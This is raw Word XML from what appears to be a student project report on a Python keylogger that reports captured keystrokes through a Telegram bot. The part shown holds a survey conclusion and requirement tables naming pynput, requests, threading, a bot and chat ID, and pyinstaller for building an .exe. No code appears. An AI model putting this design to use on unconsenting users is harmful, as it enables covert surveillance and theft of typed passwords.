            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="00E8C0B2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Direct Telegram notification</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1A057A73" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="6981E298">
          <v:rect id="_x0000_i1344" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F373EDB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>2.5 Conclusion of Survey</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6573306C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">The literature survey indicates that while keystroke logging itself is not new, using </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram as a reporting channel</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is still emerging. This project attempts to fill that gap by providing a documented, working implementation of a </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Python-based keylogger with Telegram reporting</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E37743E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A1C7AD9" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Chapter 3 – System Analysis &amp; Design</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A1AE6D" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>3.1 System Requirements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52AD4C09" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>3.1.1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605"/>
        <w:gridCol w:w="1841"/>
      </w:tblGrid>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="02B6FD0D" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D4AD733" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Component</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B2EA8E1" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Minimum</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6811820C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Recommended</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="4F0C3AB2" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="41168469" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Processor</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="17E27BD4" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Intel / AMD Dual Core</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="66B529AA" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Intel i3 or above</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="054BA0F2" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="233493A3" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>RAM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="331086F1" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>2 GB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C15A445" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>4 GB</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="52D596FC" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="416A0808" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Storage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1BC2E384" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>50 MB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E9EF2CE" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>100 MB</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="0F4E7B60" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="670E2CB1" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Network</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="25D578C4" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Internet connection required (for Telegram API)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0986B15A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Broadband / Wi-Fi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="50DFD5C2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>3.1.2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4176"/>
      </w:tblGrid>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="703102C3" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3618630C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Component</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="609C8897" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="6C8E8F9A" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2343E0FD" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Operating System</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7E1AFDFB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Windows 7/8/10 or Linux</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="27C67021" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3427E5E1" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Python Version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="79AAC7F8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Python 3.8 or above</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="5F501BE0" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02C85F5C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Libraries</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5BFEF6D4" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>pynput</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>, requests, threading</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="70A3F441" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F4A50B2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Telegram Account</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="01067ADC" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Required to create a bot and receive chat ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="39C751F0" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5CDE5381" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Optional Tool</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="583664D6" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>pyinstaller</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t xml:space="preserve"> (to create .exe file)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E9F491E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="726DA17D">
          <v:rect id="_x0000_i1385" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC4D113" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>3.2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5926"/>
      </w:tblGrid>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="03A74607" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C95A331" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Functionality</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03A247C0" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="58B46599" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="433633A3" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Keystroke Capture</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
